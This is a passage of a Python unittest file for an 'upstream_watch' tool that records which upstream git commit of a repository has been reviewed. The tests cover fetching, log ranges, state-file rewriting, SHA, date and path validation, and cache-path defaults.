        self.assertIn("https://github.com/yotthani/bannerlord.git", first)
        self.assertNotIn("checkout", self.verbs(git))
        self.assertIn("### HoN/DualWield (feature)", out.getvalue())

    def test_existing_dir_fetches(self):
        git = FakeGit(self.log)
        clone = os.path.join(self.tmp.name, "clone")
        os.makedirs(os.path.join(clone, ".git"))
        uw.run_areas(self.state_path, "yotthani/bannerlord", clone, None, git, io.StringIO())
        self.assertIn("fetch", self.verbs(git))
        self.assertNotIn("clone", self.verbs(git))
        self.assertNotIn("checkout", self.verbs(git))
        self.assertNotIn("reset", self.verbs(git))

    def test_range_starts_at_reviewed_sha(self):
        git = FakeGit(self.log)
        uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), None, git, io.StringIO())
        log_call = [c[0] for c in git.calls if c[0][0] == "log"][0]
        self.assertTrue(any(a.startswith(SHA_A + "..") for a in log_call))

    def test_out_file_is_written(self):
        git = FakeGit(self.log)
        target = os.path.join(self.tmp.name, "brief.md")
        code = uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), target, git, io.StringIO())
        self.assertEqual(code, 0)
        with open(target, encoding="utf-8") as f:
            self.assertIn("yotthani/bannerlord", f.read())

    def test_brief_names_the_full_pinned_head(self):
        out = io.StringIO()
        uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), None,
                     FakeGit(self.log), out)
        self.assertIn("`%s..%s`" % (SHA_A, SHA_B), out.getvalue())

    def test_log_skips_rename_detection(self):
        git = FakeGit(self.log)
        uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), None, git, io.StringIO())
        log_call = [c[0] for c in git.calls if c[0][0] == "log"][0]
        self.assertIn("--no-renames", log_call)

    def test_missing_feature_path_is_warned_about(self):
        out = io.StringIO()
        git = FakeGit(self.log, tree=["HoN/DualWield", "RealmUI"])
        uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), None, git, out)
        warnings = [l for l in out.getvalue().splitlines() if l.startswith("WARNING")]
        self.assertEqual(len(warnings), 1)
        self.assertIn("docs/realm-ui", warnings[0])
        self.assertNotIn("RealmUI", warnings[0])
        ls_calls = [c for c in git.calls if c[0][0] == "ls-tree"]
        self.assertEqual(len(ls_calls), 1)
        self.assertEqual(ls_calls[0][0][:4], ["ls-tree", "--name-only", SHA_B, "--"])

    def test_no_warning_when_every_feature_path_exists(self):
        out = io.StringIO()
        uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), None,
                     FakeGit(self.log), out)
        self.assertNotIn("WARNING", out.getvalue())

    def test_out_write_failure_exits_two(self):
        blocker = os.path.join(self.tmp.name, "afile")
        with open(blocker, "w") as f:
            f.write("x")
        target = os.path.join(blocker, "brief.md")  # a file where a directory is needed
        out = io.StringIO()
        code = uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), target,
                            FakeGit(self.log), out)
        self.assertEqual(code, 2)
        self.assertIn("upstream_watch:", out.getvalue())

    def test_unwatched_repo_exits_two(self):
        code = uw.run_areas(self.state_path, "someone/else", os.path.join(self.tmp.name, "c"), None, FakeGit(), io.StringIO())
        self.assertEqual(code, 2)

    def test_git_failure_exits_three(self):
        def git(args, cwd=None):
            return (128, "", "fatal: unable to access")

        code = uw.run_areas(self.state_path, "yotthani/bannerlord", os.path.join(self.tmp.name, "c"), None, git, io.StringIO())
        self.assertEqual(code, 3)


class AdvanceTests(TempFiles):
    def setUp(self):
        super().setUp()
        self.write_state(state_with(ENTRY))
        self.record = os.path.join(self.tmp.name, "adopt-yotthani-2026-10-17.md")
        with open(self.record, "w") as f:
            f.write("record\n")

    def advance(self, repo="yotthani/bannerlord", sha=SHA_B, record=None, date="2026-10-17"):
        return uw.run_advance(self.state_path, repo, sha, record or self.record, date, self.tmp.name)

    def test_advance_rewrites_fields(self):
        self.assertEqual(self.advance(), 0)
        with open(self.state_path, encoding="utf-8") as f:
            data = json.load(f)
        e = data["repos"][0]
        self.assertEqual(e["reviewed"], SHA_B)
        self.assertEqual(e["reviewed_on"], "2026-10-17")
        self.assertTrue(e["record"].endswith("adopt-yotthani-2026-10-17.md"))
        self.assertEqual(e["feature_paths"], ENTRY["feature_paths"])

    def test_rewrite_is_stable_formatting(self):
        self.advance()
        with open(self.state_path, encoding="utf-8", newline="") as f:
            first = f.read()
        self.assertTrue(first.endswith("}\n"))
        self.assertNotIn("\r", first)
        self.assertIn('\n  "repos": [\n    {\n      "repo": "yotthani/bannerlord"', first)
        self.advance()
        with open(self.state_path, encoding="utf-8", newline="") as f:
            self.assertEqual(f.read(), first)

    def test_key_order_is_preserved(self):
        self.advance()
        with open(self.state_path, encoding="utf-8") as f:
            data = json.load(f, object_pairs_hook=list)
        keys = [k for k, _ in data[1][1][0]]
        self.assertEqual(keys, ["repo", "reviewed", "reviewed_on", "record", "feature_paths"])

    def test_other_repos_untouched(self):
        other = dict(ENTRY, repo="yotthani/MithrilForge")
        self.write_state(state_with(ENTRY, other))
        self.advance()
        with open(self.state_path, encoding="utf-8") as f:
            data = json.load(f)
        self.assertEqual(data["repos"][1], other)

    def test_bad_sha_rejected_and_file_unchanged(self):
        with open(self.state_path, encoding="utf-8") as f:
            before = f.read()
        for bad in ("abc123", SHA_B[:-1], SHA_B + "0", "z" * 40, ""):
            self.assertEqual(self.advance(sha=bad), 2, bad)
        with open(self.state_path, encoding="utf-8") as f:
            self.assertEqual(f.read(), before)

    def test_missing_record_rejected(self):
        self.assertEqual(self.advance(record=os.path.join(self.tmp.name, "nope.md")), 2)
        with open(self.state_path, encoding="utf-8") as f:
            self.assertEqual(json.load(f)["repos"][0]["reviewed"], SHA_A)

    def test_unknown_repo_rejected(self):
        self.assertEqual(self.advance(repo="someone/else"), 2)

    def test_bad_date_rejected(self):
        self.assertEqual(self.advance(date="17/10/2026"), 2)

    def test_uppercase_sha_is_lowercased(self):
        self.advance(sha=SHA_B.upper())
        with open(self.state_path, encoding="utf-8") as f:
            self.assertEqual(json.load(f)["repos"][0]["reviewed"], SHA_B)

    def test_malformed_state_rejected(self):
        self.write_state("{ nope")
        self.assertEqual(self.advance(), 2)

    def test_record_is_stored_as_a_forward_slash_relpath(self):
        os.makedirs(os.path.join(self.tmp.name, "docs", "reviews"))
        rec = os.path.join(self.tmp.name, "docs", "reviews", "r.md")
        with open(rec, "w") as f:
            f.write("record\n")
        self.assertEqual(self.advance(record=rec), 0)
        with open(self.state_path, encoding="utf-8") as f:
            self.assertEqual(json.load(f)["repos"][0]["record"], "docs/reviews/r.md")

    def test_record_outside_the_root_is_rejected_and_state_untouched(self):
        with tempfile.TemporaryDirectory() as elsewhere:
            rec = os.path.join(elsewhere, "r.md")
            with open(rec, "w") as f:
                f.write("record\n")
            with open(self.state_path, encoding="utf-8") as f:
                before = f.read()
            self.assertEqual(self.advance(record=rec), 2)
            with open(self.state_path, encoding="utf-8") as f:
                self.assertEqual(f.read(), before)

    def test_record_on_another_drive_is_rejected_and_state_untouched(self):
        with open(self.state_path, encoding="utf-8") as f:
            before = f.read()
        with mock.patch.object(uw.os.path, "commonpath", side_effect=ValueError("Paths don't have the same drive")):
            self.assertEqual(self.advance(), 2)
        with open(self.state_path, encoding="utf-8") as f:
            self.assertEqual(f.read(), before)

    def test_root_prefix_sibling_is_outside(self):
        sibling = self.tmp.name + "-sibling"
        os.makedirs(sibling)
        self.addCleanup(shutil.rmtree, sibling, True)
        rec = os.path.join(sibling, "r.md")
        with open(rec, "w") as f:
            f.write("record\n")
        self.assertEqual(self.advance(record=rec), 2)


class MainWiringTests(TempFiles):
    def test_status_runs_through_main(self):
        self.write_state(state_with(ENTRY))
        out = io.StringIO()
        env = {"TAOM_UPSTREAM_CACHE": self.cache_path}
        with mock.patch.dict(os.environ, env), mock.patch.object(uw, "real_gh", FakeGh(compare_reply(2))), \
                contextlib.redirect_stdout(out):
            code = uw.main(["--state", self.state_path, "status", "--brief", "--budget", "4"])
        self.assertEqual(code, 0)
        self.assertIn("UPSTREAM AHEAD: yotthani/bannerlord has 2 new commits", out.getvalue())
        self.assertTrue(os.path.isfile(self.cache_path))

    def test_status_has_no_offline_flag(self):
        with self.assertRaises(SystemExit), contextlib.redirect_stderr(io.StringIO()):
            uw.main(["--state", self.state_path, "status", "--offline"])

    def test_advance_runs_through_main(self):
        self.write_state(state_with(ENTRY))
        rec = os.path.join(self.tmp.name, "rec.md")
        with open(rec, "w") as f:
            f.write("record\n")
        with mock.patch.object(uw, "REPO_ROOT", self.tmp.name):
            code = uw.main(["--state", self.state_path, "advance", "--repo", "yotthani/bannerlord",
                            "--sha", SHA_B, "--record", rec, "--date", "2026-10-17"])
        self.assertEqual(code, 0)
        with open(self.state_path, encoding="utf-8") as f:
            e = json.load(f)["repos"][0]
        self.assertEqual((e["reviewed"], e["reviewed_on"], e["record"]), (SHA_B, "2026-10-17", "rec.md"))


class CachePathTests(unittest.TestCase):
    def test_env_overrides_default(self):
        old = os.environ.get("TAOM_UPSTREAM_CACHE")
        os.environ["TAOM_UPSTREAM_CACHE"] = "X:/somewhere/c.json"
        try:
            self.assertEqual(uw.default_cache_path(), "X:/somewhere/c.json")
        finally:
            if old is None:
                del os.environ["TAOM_UPSTREAM_CACHE"]
            else:
                os.environ["TAOM_UPSTREAM_CACHE"] = old

    def test_default_is_outside_the_repo(self):
        old = os.environ.pop("TAOM_UPSTREAM_CACHE", None)
        try:
            self.assertEqual(uw.default_cache_path().replace("\\", "/"), "E:/Temp/taom-upstream-watch/cache.json")
        finally:
            if old is not None:
                os.environ["TAOM_UPSTREAM_CACHE"] = old


if __name__ == "__main__":
    unittest.main()
